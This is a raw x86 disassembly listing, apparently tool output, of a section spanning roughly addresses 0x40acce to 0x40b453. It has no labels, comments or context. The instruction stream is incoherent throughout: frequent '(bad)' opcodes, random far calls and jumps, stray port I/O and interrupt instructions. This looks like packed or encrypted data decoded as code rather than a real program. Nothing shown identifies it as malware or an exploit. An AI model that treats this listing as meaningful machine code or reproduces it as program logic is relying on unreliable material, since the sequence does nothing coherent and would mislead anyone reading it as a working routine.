  40acce:	fldln2 
  40acd0:	xor    eax,0x8b81c2bf
  40acd5:	scas   al,BYTE PTR es:[edi]
  40acd6:	xor    eax,0xcee4ab58
  40acdb:	adc    esp,0x0
  40acde:	shl    edx,1
  40ace0:	les    ebp,FWORD PTR [esi-0x23]
  40ace3:	dec    ebx
  40ace4:	sbb    DWORD PTR [eax+0x4c],0xc
  40ace8:	jne    0x40ad36
  40acea:	mov    ebx,es
  40acec:	ja     0x40ad3d
  40acee:	push   eax
  40acef:	(bad)  
  40acf0:	aad    0xda
  40acf2:	mov    ebp,DWORD PTR [edx+edi*4+0xe]
  40acf6:	and    esp,0x9ee068ac
  40acfc:	fcom   QWORD PTR ds:0x50fcd81b
  40ad02:	lock mov ds:0xa5d4f26e,eax
  40ad08:	test   BYTE PTR [ecx+0x188e7c47],bl
  40ad0e:	adc    ah,BYTE PTR [edx]
  40ad10:	cmp    DWORD PTR [ebx+0x1ae2a246],ebx
  40ad16:	leave  
  40ad17:	push   0xffffff88
  40ad19:	in     eax,0x50
  40ad1b:	mov    ch,0x23
  40ad1d:	dec    esp
  40ad1e:	or     esi,ecx
  40ad20:	sub    al,bl
  40ad22:	out    dx,eax
  40ad23:	jl     0x40ad1b
  40ad25:	and    al,0x68
  40ad27:	mov    ebp,0x688141ec
  40ad2c:	xor    eax,0x36d06fb8
  40ad31:	(bad)  
  40ad32:	pop    eax
  40ad33:	mov    eax,ds:0x4ab9aa51
  40ad38:	jl     0x40ad0c
  40ad3a:	mov    bh,0xc3
  40ad3c:	clc    
  40ad3d:	iret   
  40ad3e:	push   esp
  40ad3f:	call   FWORD PTR [ebx]
  40ad41:	std    
  40ad42:	test   BYTE PTR [ebx+ebp*2],cl
  40ad45:	jmp    0x40ad32
  40ad47:	inc    DWORD PTR [eax-0x17]
  40ad4a:	adc    ch,BYTE PTR [ebp+0x49]
  40ad4d:	jno    0x40adab
  40ad4f:	enter  0x1a9c,0x86
  40ad53:	xchg   ebp,eax
  40ad54:	ds mov al,0xae
  40ad57:	push   cs
  40ad58:	lock xchg esi,eax
  40ad5a:	jg     0x40ad5f
  40ad5c:	daa    
  40ad5d:	mov    eax,ds:0x2df94185
  40ad62:	(bad)  
  40ad64:	and    al,0x57
  40ad66:	mov    DWORD PTR [ecx+eax*8-0x2d2a227d],edx
  40ad6d:	dec    ebx
  40ad6e:	sub    eax,DWORD PTR [edi+0x48838eb9]
  40ad74:	push   esp
  40ad75:	sub    DWORD PTR [ebp-0x1c],edi
  40ad78:	lds    esp,FWORD PTR cs:[edi+0x1d232e3a]
  40ad7f:	lock add BYTE PTR [edi+0x713a6012],0x9f
  40ad87:	imul   esi,DWORD PTR [edx-0x9fdefe2],0xf
  40ad8e:	aam    0xfe
  40ad90:	inc    eax
  40ad91:	mov    edi,0x126f2e64
  40ad96:	xlat   BYTE PTR ds:[ebx]
  40ad97:	dec    ebx
  40ad98:	lahf   
  40ad99:	scas   eax,DWORD PTR es:[edi]
  40ad9a:	mov    ebx,0x690575aa
  40ad9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ada0:	mov    eax,ds:0x4151e3af
  40ada5:	inc    ecx
  40ada6:	xor    esp,DWORD PTR [edx-0x249e9110]
  40adac:	stos   BYTE PTR es:[edi],al
  40adad:	mov    WORD PTR [edi-0x80],?
  40adb0:	retf   0x63b9
  40adb3:	dec    esi
  40adb4:	jae    0x40ad5d
  40adb6:	sub    BYTE PTR [ebx],bl
  40adb8:	stos   DWORD PTR es:[edi],eax
  40adb9:	add    bh,bh
  40adbb:	cmp    BYTE PTR [ebp+0x2],al
  40adbe:	fs int 0x74
  40adc1:	and    ecx,esp
  40adc3:	sub    ebx,DWORD PTR [ebx-0x36a913ed]
  40adc9:	ja     0x40add9
  40adcb:	xor    dl,dh
  40adcd:	and    ecx,DWORD PTR [eax+eiz*4]
  40add0:	cdq    
  40add1:	jbe    0x40ade5
  40add3:	adc    DWORD PTR [ecx+0x7faeadc6],edx
  40add9:	ret    0x1f76
  40addc:	mov    edi,0x9931fc46
  40ade1:	push   0x1b81ea28
  40ade6:	xchg   edi,eax
  40ade7:	fwait
  40ade8:	aas    
  40ade9:	aas    
  40adea:	aaa    
  40adeb:	jle    0x40ae0f
  40aded:	leave  
  40adee:	cmp    cl,BYTE PTR [ecx-0x41c353f0]
  40adf4:	gs add eax,0x7d548c66
  40adfa:	push   ds
  40adfb:	std    
  40adfc:	mov    dl,0x9c
  40adfe:	jo     0x40adca
  40ae00:	aaa    
  40ae01:	or     edi,DWORD PTR ds:0x31398f9f
  40ae07:	clc    
  40ae08:	xchg   ebp,eax
  40ae09:	sbb    BYTE PTR [ebp+0x34],bh
  40ae0c:	cmp    BYTE PTR [ecx-0x6e],ah
  40ae0f:	jnp    0x40ae7a
  40ae11:	push   esp
  40ae12:	push   ds
  40ae13:	mov    esi,0xf6dd9aa
  40ae18:	call   eax
  40ae1a:	mov    bl,0xb8
  40ae1c:	push   0xc111b9e7
  40ae21:	jbe    0x40aea0
  40ae23:	xchg   ebx,eax
  40ae24:	xor    BYTE PTR [ecx],ah
  40ae26:	pushf  
  40ae27:	cmp    DWORD PTR [edx+0x41],0x514e8cfc
  40ae2e:	retf   0x60f3
  40ae31:	add    edx,0x1b
  40ae34:	mov    WORD PTR [ebx-0x5d1f64b3],cs
  40ae3a:	xchg   ecx,eax
  40ae3b:	dec    edx
  40ae3c:	xchg   BYTE PTR ds:0x8bdcd759,dl
  40ae42:	xor    ebx,edx
  40ae44:	push   cs
  40ae45:	dec    ebx
  40ae46:	jle    0x40ae93
  40ae48:	test   BYTE PTR [edx+0x5f],al
  40ae4b:	jne    0x40aec7
  40ae4d:	bound  edi,QWORD PTR [edx+esi*4]
  40ae50:	add    bh,BYTE PTR [edx+0x78]
  40ae53:	js     0x40add8
  40ae55:	xchg   esp,eax
  40ae56:	dec    ebp
  40ae57:	icebp  
  40ae58:	int3   
  40ae59:	call   0xc057:0xaae60a77
  40ae60:	cmc    
  40ae61:	cmc    
  40ae62:	sub    esi,DWORD PTR [edi+0x46c6e8ad]
  40ae68:	jl     0x40ae36
  40ae6a:	xchg   esp,eax
  40ae6b:	cdq    
  40ae6c:	mov    ah,0xa9
  40ae6e:	push   0xb05cda66
  40ae73:	or     edi,eax
  40ae75:	ds push esp
  40ae77:	(bad)  
  40ae78:	cmp    ecx,edi
  40ae7a:	leave  
  40ae7b:	ss mov esi,0xd80eb03d
  40ae81:	cwde   
  40ae82:	pop    es
  40ae83:	xor    al,0xd5
  40ae85:	pop    edx
  40ae86:	aam    0x9c
  40ae88:	cmp    DWORD PTR [eax],0xe
  40ae8b:	ret    
  40ae8c:	adc    ebx,ebx
  40ae8e:	retf   0x9234
  40ae91:	fcomp  st(3)
  40ae93:	mov    WORD PTR [ebx+0x33],?
  40ae96:	mov    fs,WORD PTR [esi-0xd]
  40ae99:	pusha  
  40ae9a:	shl    edx,1
  40ae9c:	stc    
  40ae9d:	xlat   BYTE PTR ds:[ebx]
  40ae9e:	and    dh,BYTE PTR [ebp+0x2384c1df]
  40aea4:	call   0xf3a609ef
  40aea9:	mov    DWORD PTR [ecx+0x2a],esi
  40aeac:	adc    DWORD PTR [ebx+0x7be2c7ca],esi
  40aeb2:	mov    esi,0x665301f8
  40aeb7:	jge    0x40aef6
  40aeb9:	jns    0x40aef2
  40aebb:	push   cs
  40aebc:	mov    edx,ds
  40aebe:	test   BYTE PTR [edx-0x3b],cl
  40aec1:	inc    ebp
  40aec2:	mov    eax,ds:0x32da8008
  40aec7:	mov    ah,0xee
  40aec9:	push   esp
  40aeca:	test   BYTE PTR [ecx],bl
  40aecc:	jnp    0x40ae8a
  40aece:	scas   eax,DWORD PTR es:[edi]
  40aecf:	lea    ecx,ds:0xa98161e8
  40aed5:	cmp    DWORD PTR [ebx-0x61],esi
  40aed8:	iret   
  40aed9:	in     eax,dx
  40aeda:	sbb    DWORD PTR ds:0x86d37ee6,0x8a3998ee
  40aee4:	jns    0x40af63
  40aee6:	inc    esi
  40aee7:	mov    cl,0x6c
  40aee9:	and    DWORD PTR [edi+ebx*4+0x66],esp
  40aeed:	int    0x43
  40aeef:	gs sub bl,dl
  40aef2:	sub    esp,edi
  40aef4:	push   0xacc8d56e
  40aef9:	jle    0x40ae8b
  40aefb:	add    dl,BYTE PTR [esi-0x7d]
  40aefe:	jbe    0x40af64
  40af00:	jae    0x40ae94
  40af02:	fcomp  QWORD PTR [esi-0x16]
  40af05:	dec    eax
  40af06:	mov    ch,0xec
  40af08:	(bad)  
  40af09:	pop    ss
  40af0a:	mov    ch,0xb3
  40af0c:	pop    edx
  40af0d:	dec    eax
  40af0e:	outs   dx,BYTE PTR ds:[esi]
  40af0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af10:	(bad)  
  40af11:	adc    eax,0xe56fbce
  40af16:	dec    eax
  40af17:	xchg   BYTE PTR [edx],bh
  40af19:	or     dh,BYTE PTR [edi]
  40af1b:	aam    0xe1
  40af1d:	fwait
  40af1e:	loope  0x40af00
  40af20:	mov    eax,0x339b0431
  40af25:	add    al,0x30
  40af27:	xor    al,cl
  40af29:	or     ecx,DWORD PTR ds:0x20a913a4
  40af2f:	inc    eax
  40af30:	loop   0x40aecb
  40af32:	and    eax,edi
  40af34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af35:	pop    ebx
  40af36:	mov    ds:0x2748644e,eax
  40af3b:	pop    ss
  40af3c:	mov    edi,0x67104c89
  40af41:	mov    DWORD PTR [ecx+eiz*2-0x396ef371],ecx
  40af48:	dec    ebp
  40af49:	jbe    0x40afb8
  40af4b:	out    dx,al
  40af4c:	fist   WORD PTR [esi]
  40af4e:	mov    dl,0x21
  40af50:	fwait
  40af51:	jns    0x40af34
  40af53:	shl    DWORD PTR [esi+0x58b085fe],cl
  40af59:	mov    eax,0xd6aeed4c
  40af5e:	retf   0xe6c5
  40af61:	fild   DWORD PTR [esi-0x61]
  40af64:	xchg   edx,esi
  40af66:	and    ecx,ebx
  40af68:	(bad)  
  40af69:	mov    eax,ds:0xd72ee347
  40af6e:	pop    edx
  40af6f:	xchg   ebx,eax
  40af70:	push   edx
  40af71:	je     0x40afad
  40af73:	xchg   edi,eax
  40af74:	add    esi,DWORD PTR [edx+0x6]
  40af77:	mov    eax,0xcc7a0cd6
  40af7c:	and    DWORD PTR [edx+0x6a9ce03c],0xffffffe4
  40af83:	sti    
  40af84:	add    ecx,DWORD PTR [eax+0x2bedcd60]
  40af8a:	stos   BYTE PTR es:[edi],al
  40af8b:	leave  
  40af8c:	jo     0x40afb5
  40af8e:	in     eax,dx
  40af8f:	inc    esp
  40af90:	or     DWORD PTR [eax+0x59],esp
  40af93:	mov    ah,0x9b
  40af95:	rcr    DWORD PTR [eax-0x2abc81de],cl
  40af9b:	es aad 0xd1
  40af9e:	je     0x40af43
  40afa0:	xor    DWORD PTR [ebp+0x5b],esp
  40afa3:	mov    eax,0x6b019157
  40afa8:	into   
  40afa9:	sbb    BYTE PTR [ebx+0x21c6006b],bh
  40afaf:	or     al,0x58
  40afb1:	in     al,0x5c
  40afb3:	ficom  DWORD PTR [edx+edi*1]
  40afb6:	push   esi
  40afb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afb8:	mov    ecx,0x87b143d7
  40afbd:	or     eax,0xb7a4b122
  40afc2:	das    
  40afc3:	sub    BYTE PTR [edx+eax*1],al
  40afc6:	push   ds
  40afc7:	adc    DWORD PTR [esi+ebx*4+0x25],ecx
  40afcb:	dec    esp
  40afcc:	lock mov esi,0x3412e316
  40afd2:	cmp    eax,0x27d35955
  40afd7:	ins    BYTE PTR es:[edi],dx
  40afd8:	xchg   edx,eax
  40afd9:	stos   DWORD PTR es:[edi],eax
  40afda:	push   edx
  40afdb:	call   0x4088:0x77a13ded
  40afe2:	push   esp
  40afe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afe4:	mov    bl,0x75
  40afe6:	scas   eax,DWORD PTR es:[edi]
  40afe7:	jo     0x40af76
  40afe9:	dec    esi
  40afea:	das    
  40afeb:	out    0xaf,eax
  40afed:	push   eax
  40afee:	dec    ebx
  40afef:	push   ss
  40aff0:	loop   0x40b01a
  40aff2:	scas   eax,DWORD PTR es:[edi]
  40aff3:	lods   eax,DWORD PTR ds:[esi]
  40aff4:	mov    WORD PTR [edx+edi*2],es
  40aff7:	bndcl  (bad),ebx
  40affb:	add    al,0xea
  40affd:	iret   
  40affe:	int3   
  40afff:	mov    eax,0x40b7a17f
  40b004:	sub    ecx,ebp
  40b006:	cdq    
  40b007:	push   0x77ab65ca
  40b00c:	push   edx
  40b00d:	js     0x40b007
  40b00f:	test   al,0x12
  40b011:	mov    ah,0x58
  40b013:	scas   al,BYTE PTR es:[edi]
  40b014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b015:	xor    eax,0xc0740be6
  40b01a:	and    esp,DWORD PTR [eax]
  40b01c:	push   edx
  40b01d:	mov    al,0x24
  40b01f:	mov    ecx,0x379bb8bd
  40b024:	jmp    0x622b:0xdc5e2dff
  40b02b:	neg    DWORD PTR [esi]
  40b02d:	push   ds
  40b02e:	mov    ah,0x2
  40b030:	or     eax,DWORD PTR [edx+0x12327b9f]
  40b036:	call   0x2889:0xe244e793
  40b03d:	sub    DWORD PTR [eax+ebp*8],ebx
  40b040:	jp     0x40b026
  40b042:	sub    al,0xad
  40b044:	xchg   edx,eax
  40b045:	sahf   
  40b046:	mov    ah,0x9a
  40b048:	repz jmp 0x20b9:0x298660a5
  40b050:	adc    al,0x15
  40b052:	sbb    DWORD PTR [edx+edi*8-0x71f6f624],0xbd947734
  40b05d:	stos   DWORD PTR es:[edi],eax
  40b05e:	adc    ebx,DWORD PTR [eax+0x27]
  40b061:	leave  
  40b062:	call   0x6bd9:0xa6e05265
  40b069:	mov    eax,ds:0x10639503
  40b06e:	stos   DWORD PTR es:[edi],eax
  40b06f:	int    0x84
  40b071:	fs ja  0x40b09b
  40b074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b075:	pop    ecx
  40b076:	mov    dl,0x4f
  40b078:	sub    eax,0x303d2fcb
  40b07d:	dec    edx
  40b07e:	jle    0x40b0da
  40b080:	addr16 mov edx,0x993914f7
  40b086:	pop    edx
  40b087:	or     ebx,DWORD PTR [ecx]
  40b089:	shl    BYTE PTR [ecx],1
  40b08b:	mov    DWORD PTR [edx],edi
  40b08d:	stc    
  40b08e:	aam    0x8f
  40b090:	scas   eax,DWORD PTR es:[edi]
  40b091:	aad    0x24
  40b093:	xchg   esp,eax
  40b094:	push   esp
  40b095:	in     eax,0x3
  40b097:	jge    0x40b0f8
  40b099:	pop    esp
  40b09a:	jp     0x40b0f1
  40b09c:	enter  0x72b0,0xe0
  40b0a0:	push   ebx
  40b0a1:	add    eax,0xbbd878a2
  40b0a6:	aaa    
  40b0a7:	jbe    0x40b11e
  40b0a9:	sbb    esp,DWORD PTR [ebx+esi*8-0x628ca53e]
  40b0b0:	pop    esi
  40b0b1:	dec    ebp
  40b0b2:	fsqrt  
  40b0b4:	mov    al,ds:0x47978fbd
  40b0b9:	mov    esi,0x2335dbfc
  40b0be:	mov    DWORD PTR [eax],ebx
  40b0c0:	loopne 0x40b0ec
  40b0c2:	popf   
  40b0c3:	in     al,dx
  40b0c4:	jno    0x40b0eb
  40b0c6:	jle    0x40b05d
  40b0c8:	popf   
  40b0c9:	call   0xafed:0x5c7329a4
  40b0d0:	pop    ebx
  40b0d1:	je     0x40b09c
  40b0d3:	adc    al,0x9
  40b0d5:	shl    BYTE PTR [ebx],0x14
  40b0d8:	nop
  40b0d9:	out    dx,al
  40b0da:	stos   BYTE PTR es:[edi],al
  40b0db:	push   es
  40b0dc:	dec    esp
  40b0dd:	inc    esi
  40b0de:	lods   al,BYTE PTR ds:[esi]
  40b0df:	mov    dh,0x47
  40b0e1:	in     eax,0x53
  40b0e3:	fdivr  st,st(7)
  40b0e5:	lea    edx,[edx]
  40b0e7:	sbb    eax,0x7251433f
  40b0ec:	or     ebx,eax
  40b0ee:	push   ebx
  40b0ef:	sar    ecx,cl
  40b0f1:	into   
  40b0f2:	jo     0x40b159
  40b0f4:	das    
  40b0f5:	rcl    DWORD PTR [esi+0x49648df8],1
  40b0fb:	ror    al,0xd5
  40b0fe:	mov    esp,0x7dae1224
  40b103:	iret   
  40b104:	ss mov ebx,ebx
  40b107:	cdq    
  40b108:	dec    ebx
  40b109:	sub    esi,0x1b0c0dc8
  40b10f:	rcr    BYTE PTR [ebx-0x1c45d6f],0x3f
  40b116:	(bad)  
  40b117:	fdivr  DWORD PTR [esi-0xd]
  40b11a:	pop    esi
  40b11b:	pop    ebx
  40b11c:	cmc    
  40b11d:	cli    
  40b11e:	test   DWORD PTR [esi-0x12],ebp
  40b121:	inc    ebp
  40b122:	fisttp QWORD PTR [ecx+0x6d]
  40b125:	popa   
  40b126:	pusha  
  40b127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b128:	(bad)  
  40b129:	sub    DWORD PTR [ecx+edi*1],esi
  40b12c:	fisub  WORD PTR [ebp-0x25]
  40b12f:	xchg   ebp,eax
  40b130:	cdq    
  40b131:	mov    bh,0x7
  40b133:	xor    eax,DWORD PTR [edi+0x49dae99f]
  40b139:	sub    dh,bl
  40b13b:	pusha  
  40b13c:	daa    
  40b13d:	fstp   TBYTE PTR [esi]
  40b13f:	outs   dx,DWORD PTR ds:[esi]
  40b140:	pop    esp
  40b141:	xchg   edx,eax
  40b142:	mov    ebx,0x7ecd49c9
  40b147:	push   ds
  40b148:	xchg   edi,eax
  40b149:	out    dx,al
  40b14a:	push   ds
  40b14b:	fild   DWORD PTR [ebx-0x76]
  40b14e:	clc    
  40b14f:	aad    0x66
  40b151:	adc    eax,DWORD PTR [esi+ebp*2+0x503298c9]
  40b158:	int3   
  40b159:	add    edi,ecx
  40b15b:	push   0xec346d43
  40b160:	repnz pop es
  40b162:	imul   esp,DWORD PTR [edi+ebx*8-0x27662ed1],0xffffff90
  40b16a:	ror    BYTE PTR [edi+0x6d78ac23],cl
  40b170:	inc    eax
  40b171:	ss mov ah,0xd7
  40b174:	les    ecx,FWORD PTR [ebx+0x23]
  40b177:	inc    esp
  40b178:	(bad)  
  40b179:	mov    BYTE PTR [ebp+esi*8+0x14],ch
  40b17d:	adc    bl,BYTE PTR [ebx-0x315ff726]
  40b183:	ror    DWORD PTR [esi],0x2
  40b186:	xchg   BYTE PTR [edi],dl
  40b188:	add    BYTE PTR ds:0xe5d63170,bl
  40b18e:	out    0x10,al
  40b190:	dec    ecx
  40b191:	mov    esi,0x2a1356b8
  40b196:	ror    BYTE PTR [edx+0x772350f7],1
  40b19c:	xchg   edx,eax
  40b19d:	int3   
  40b19e:	mov    ds:0xe7ca542b,al
  40b1a3:	ins    DWORD PTR es:[edi],dx
  40b1a4:	mov    BYTE PTR [edi+0x745561a],ch
  40b1aa:	xor    eax,0xcd0282b8
  40b1af:	lods   eax,DWORD PTR ds:[esi]
  40b1b0:	mov    dl,BYTE PTR [eax-0x369ed1b3]
  40b1b6:	in     al,dx
  40b1b7:	mov    esp,0x3bd711e6
  40b1bc:	mov    ebx,0xf256fbac
  40b1c1:	(bad)  
  40b1c2:	cwde   
  40b1c3:	dec    edx
  40b1c4:	or     bh,BYTE PTR [edi-0x4d]
  40b1c7:	ins    BYTE PTR es:[edi],dx
  40b1c8:	mov    ch,0x66
  40b1ca:	jne    0x40b185
  40b1cc:	ins    DWORD PTR es:[edi],dx
  40b1cd:	int    0x5a
  40b1cf:	dec    ecx
  40b1d0:	sti    
  40b1d1:	jns    0x40b1ec
  40b1d3:	adc    ebx,DWORD PTR ds:0x8dde368
  40b1d9:	xor    DWORD PTR [ebp-0x186892a4],ebp
  40b1df:	(bad)  
  40b1e0:	xor    eax,DWORD PTR [esi]
  40b1e2:	push   cs
  40b1e3:	out    dx,al
  40b1e4:	push   cs
  40b1e5:	retf   0xf335
  40b1e8:	or     bl,BYTE PTR [ebp+0x581ee5fa]
  40b1ee:	out    0xe4,al
  40b1f0:	fbstp  TBYTE PTR [edx+0x5e]
  40b1f3:	and    eax,0x90b6a3c7
  40b1f8:	add    al,0x6b
  40b1fa:	push   esp
  40b1fb:	jp     0x40b256
  40b1fd:	cs inc edi
  40b1ff:	test   al,0x54
  40b201:	pushf  
  40b202:	ins    BYTE PTR es:[edi],dx
  40b203:	lods   eax,DWORD PTR ds:[esi]
  40b204:	cmp    dh,BYTE PTR [ebp+ebx*4+0x3a6fee9d]
  40b20b:	inc    esi
  40b20c:	and    edx,DWORD PTR [ecx+ebx*4+0x68]
  40b210:	call   0xaa555fd7
  40b215:	mov    ah,0x50
  40b217:	mov    edx,0x9ac824a2
  40b21c:	push   ebp
  40b21d:	sub    DWORD PTR [eax+ebx*2],ecx
  40b220:	xor    esi,edi
  40b222:	sub    BYTE PTR [esi+0xe],dl
  40b225:	pushf  
  40b226:	xchg   edx,eax
  40b227:	imul   edi,DWORD PTR [edx],0x151fc839
  40b22d:	and    bh,bl
  40b22f:	cmp    BYTE PTR [ecx],0x62
  40b232:	ret    0x1862
  40b235:	mov    ebp,0x651999d1
  40b23a:	xor    eax,0x5fa2184a
  40b23f:	dec    esp
  40b240:	mov    ah,0x34
  40b242:	mov    cl,0x11
  40b244:	add    BYTE PTR [eax+0xc],dh
  40b247:	and    ah,BYTE PTR [esi]
  40b249:	loopne 0x40b2aa
  40b24b:	cmp    bh,al
  40b24d:	mov    eax,DWORD PTR [esi+eiz*2+0x7819ac62]
  40b254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b255:	cmp    DWORD PTR [edx-0x5f],edx
  40b258:	imul   ecx
  40b25a:	pushf  
  40b25b:	sub    ebx,DWORD PTR [edi+esi*8]
  40b25e:	sub    eax,0xcc1fa355
  40b263:	inc    ebx
  40b264:	xchg   edx,eax
  40b265:	xor    edx,DWORD PTR [ecx+0x2dfa6088]
  40b26b:	add    DWORD PTR [edx+0x64],ebx
  40b26e:	and    ah,bh
  40b270:	xchg   edx,eax
  40b271:	xchg   esp,eax
  40b272:	lock jae 0x40b20c
  40b275:	stos   DWORD PTR es:[edi],eax
  40b276:	cld    
  40b277:	js     0x40b2eb
  40b279:	sub    DWORD PTR [ecx],ebp
  40b27b:	(bad)  [esi]
  40b27d:	mov    esp,0x8ddf9e9f
  40b282:	pop    ss
  40b283:	ins    DWORD PTR es:[edi],dx
  40b284:	adc    ebp,DWORD PTR [ecx+0x1c]
  40b287:	inc    esi
  40b288:	dec    eax
  40b289:	sti    
  40b28a:	xlat   BYTE PTR ds:[ebx]
  40b28b:	dec    edi
  40b28c:	inc    edi
  40b28d:	retf   
  40b28e:	cwde   
  40b28f:	jmp    0x32c2:0x95efc45f
  40b296:	jno    0x40b278
  40b298:	sbb    al,0x35
  40b29a:	pop    ss
  40b29b:	std    
  40b29c:	call   0xe714b5d5
  40b2a1:	pop    es
  40b2a2:	mov    bl,0x8f
  40b2a4:	hlt    
  40b2a5:	fadd   st(7),st
  40b2a7:	es push 0xffffffa2
  40b2aa:	aaa    
  40b2ab:	test   eax,0xd5c38fd
  40b2b0:	aas    
  40b2b1:	xchg   esi,eax
  40b2b2:	push   edx
  40b2b3:	or     al,0x3c
  40b2b5:	sub    eax,0x729a4b49
  40b2ba:	or     DWORD PTR [esi-0xb662178],0x8dbbe31e
  40b2c4:	ret    0xb4
  40b2c7:	pop    esp
  40b2c8:	test   eax,0xec5b7b87
  40b2cd:	mov    edi,0x260b4e43
  40b2d2:	pop    esi
  40b2d3:	pusha  
  40b2d4:	xor    al,dl
  40b2d6:	aaa    
  40b2d7:	adc    DWORD PTR [ecx+0x6931f71b],edi
  40b2dd:	mov    ah,BYTE PTR [esi-0x189e1a32]
  40b2e3:	ins    BYTE PTR es:[edi],dx
  40b2e4:	pop    edi
  40b2e5:	sub    bl,BYTE PTR [esi]
  40b2e7:	ss inc edx
  40b2e9:	push   edi
  40b2ea:	cmc    
  40b2eb:	jle    0x40b271
  40b2ed:	sub    DWORD PTR [ecx-0x8],edi
  40b2f0:	fist   DWORD PTR [edx+0x72]
  40b2f3:	cmp    ah,BYTE PTR [ebp-0xb473c29]
  40b2f9:	jg     0x40b35c
  40b2fb:	mov    esp,0xfbf6d468
  40b300:	js     0x40b318
  40b302:	call   0x7a26:0x3a0ef42f
  40b309:	mov    dh,BYTE PTR [ebx+0x55827119]
  40b30f:	adc    esi,DWORD PTR [edi-0x49]
  40b312:	add    DWORD PTR [ecx+0x1f],esp
  40b315:	mov    ch,0x73
  40b317:	cmp    bh,ah
  40b319:	ins    DWORD PTR es:[edi],dx
  40b31a:	sbb    DWORD PTR [esi-0xde5f9d4],ecx
  40b320:	and    eax,0xab39fb09
  40b325:	mov    cl,0x35
  40b327:	or     DWORD PTR [edi+0x2bfd3255],ecx
  40b32d:	inc    edx
  40b32e:	jo     0x40b2b8
  40b330:	ins    DWORD PTR es:[edi],dx
  40b331:	sub    edi,DWORD PTR [esi+0x5f]
  40b334:	int3   
  40b335:	add    eax,0x851f4bb7
  40b33a:	ret    
  40b33b:	inc    ecx
  40b33c:	lods   al,BYTE PTR ds:[esi]
  40b33d:	int    0xf1
  40b33f:	jl     0x40b32e
  40b341:	nop
  40b342:	cld    
  40b343:	sub    al,0x51
  40b345:	jp     0x40b2d8
  40b347:	jne    0x40b2ef
  40b349:	and    al,BYTE PTR [ecx-0x4e]
  40b34c:	shr    DWORD PTR [ebx],1
  40b34e:	push   ebx
  40b34f:	adc    al,BYTE PTR [ecx]
  40b351:	xchg   esp,eax
  40b352:	push   edx
  40b353:	pushf  
  40b354:	sar    BYTE PTR [eax],0xcf
  40b357:	and    eax,0xb3b1e1d7
  40b35c:	icebp  
  40b35d:	out    dx,al
  40b35e:	mov    DWORD PTR [eax+0x56415610],ebp
  40b364:	ret    
  40b365:	jecxz  0x40b2ea
  40b367:	pop    esp
  40b368:	push   0x6e829c26
  40b36d:	fst    QWORD PTR [edi+esi*1-0x8]
  40b371:	mov    esp,0x6b52890d
  40b376:	pop    ebp
  40b377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b378:	mov    al,ds:0x955813c1
  40b37d:	leave  
  40b37e:	dec    ecx
  40b37f:	mov    dh,0x79
  40b381:	sbb    DWORD PTR ds:0xe2a5f39,edi
  40b387:	pop    ds
  40b388:	ss mov al,0xba
  40b38b:	nop
  40b38c:	test   DWORD PTR [ebx+0x1d],eax
  40b38f:	push   ebp
  40b390:	idiv   al
  40b392:	jno    0x40b409
  40b394:	jge    0x40b32a
  40b396:	inc    ebx
  40b397:	(bad)  
  40b398:	push   0x44
  40b39a:	pop    ds
  40b39b:	fcom   QWORD PTR [eax+0x25232207]
  40b3a1:	cmp    eax,0xb8901b0e
  40b3a6:	inc    eax
  40b3a7:	bound  esp,QWORD PTR [ebx-0x2d273cbe]
  40b3ad:	dec    esi
  40b3ae:	je     0x40b38a
  40b3b0:	mov    ah,0xd0
  40b3b2:	pop    di
  40b3b4:	push   ss
  40b3b5:	inc    eax
  40b3b6:	xlat   BYTE PTR ds:[ebx]
  40b3b7:	ror    BYTE PTR [ecx],0x92
  40b3ba:	mov    bl,0x9
  40b3bc:	nop
  40b3bd:	dec    eax
  40b3be:	adc    DWORD PTR [eax+0x12],esp
  40b3c1:	shl    DWORD PTR [ebp-0x5e],1
  40b3c4:	xor    DWORD PTR [ebp-0x32e6d9de],edx
  40b3ca:	cmp    eax,0xbe8ed3bc
  40b3cf:	add    BYTE PTR [ebp+0x526d9aae],cl
  40b3d5:	and    BYTE PTR [edi],dl
  40b3d7:	jnp    0x40b3bd
  40b3d9:	mov    ah,BYTE PTR [edx-0x55]
  40b3dc:	mov    eax,0xfaf91c00
  40b3e1:	(bad)  
  40b3e4:	jge    0x40b402
  40b3e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3e7:	xchg   edx,eax
  40b3e8:	leave  
  40b3e9:	inc    esp
  40b3ea:	push   ss
  40b3eb:	push   edi
  40b3ec:	xchg   esi,eax
  40b3ed:	addr16 int 0x88
  40b3f0:	pop    ebx
  40b3f1:	test   BYTE PTR [edi+0x3642655b],0x68
  40b3f8:	mov    esp,0x655058f3
  40b3fd:	dec    ebx
  40b3fe:	push   edx
  40b3ff:	mov    ch,BYTE PTR [eax]
  40b401:	adc    al,0x85
  40b403:	sar    DWORD PTR [eax+0x41],1
  40b406:	hlt    
  40b407:	(bad)  
  40b408:	and    DWORD PTR [esi+edx*8],ebp
  40b40b:	adc    eax,0x760d425c
  40b410:	outs   dx,BYTE PTR ds:[esi]
  40b411:	inc    ebx
  40b412:	adc    eax,0x59ce59dc
  40b417:	mov    eax,DWORD PTR [eax-0x52]
  40b41a:	sub    bl,BYTE PTR [ebx+0x29]
  40b41d:	mov    fs,WORD PTR [edi+0x3bdf826b]
  40b423:	cmp    ebx,DWORD PTR [ecx-0x42]
  40b426:	mov    edi,0x93a5ae4
  40b42b:	in     eax,dx
  40b42c:	ins    BYTE PTR es:[edi],dx
  40b42d:	jmp    0xc2f7:0x33f0fc79
  40b434:	mov    DWORD PTR ds:[ecx+0x55f53ce3],edx
  40b43b:	adc    al,0x1a
  40b43d:	mov    cl,0xf0
  40b43f:	adc    al,0xe9
  40b441:	jae    0x40b4be
  40b443:	mov    al,ds:0x18184875
  40b448:	mov    ecx,ecx
  40b44a:	or     DWORD PTR [esi-0x4f],edi
  40b44d:	cmp    BYTE PTR [ebx],al
  40b44f:	sub    ecx,DWORD PTR [edi]
  40b451:	xor    ebp,DWORD PTR [ebx]
  40b453:	mov    BYTE PTR [ebp-0x5f],al
